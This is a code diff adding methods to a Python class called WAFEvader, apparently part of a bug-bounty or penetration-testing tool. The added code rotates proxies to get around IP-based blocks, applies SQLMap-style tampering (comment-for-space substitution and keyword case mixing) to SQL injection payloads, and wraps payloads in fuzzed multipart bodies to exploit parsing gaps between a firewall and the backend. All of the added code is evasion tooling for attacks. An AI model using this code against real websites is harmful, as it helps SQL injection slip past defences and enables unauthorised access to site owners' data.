@@ -184,6 +184,48 @@ class WAFEvader:
         else:
             # Normal rate limit
             time.sleep(self.current_delay)
+    
+    def setup_proxy_rotation(self, proxy_list: list):
+        """Setup proxy rotation for bypassing IP-based blocks"""
+        self.proxies = proxy_list
+        self.current_proxy_index = 0
+    
+    def get_next_proxy(self) -> Optional[Dict]:
+        """Get next proxy from rotation"""
+        if not hasattr(self, 'proxies') or not self.proxies:
+            return None
+        
+        proxy = self.proxies[self.current_proxy_index]
+        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
+        
+        return {'http': proxy, 'https': proxy}
+    
+    def tamper_sql_payload(self, payload: str) -> str:
+        """Apply SQLMap-style tamper to SQL payloads"""
+        # Space bypass
+        payload = payload.replace(' ', '/**/') 
+        
+        # Case variation
+        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR']
+        for kw in keywords:
+            if kw in payload:
+                # Mixed case
+                payload = payload.replace(kw, ''.join(
+                    c.upper() if i % 2 == 0 else c.lower() 
+                    for i, c in enumerate(kw)
+                ))
+        
+        return payload
+    
+    def bypass_parsing_diff(self, payload: str, content_type: str = "multipart") -> str:
+        """Exploit parsing differences between WAF and backend"""
+        if content_type == "multipart":
+            # Fuzz multipart boundary
+            boundary = f"----BugBounty{random.randint(1000,9999)}"
+            # Add payload in boundary
+            return f"{boundary}\nContent-Disposition: form-data; name=\"attack\"\n\n{payload}\n{boundary}--"
+        
+        return payload
 
 if __name__ == "__main__":
     import argparse
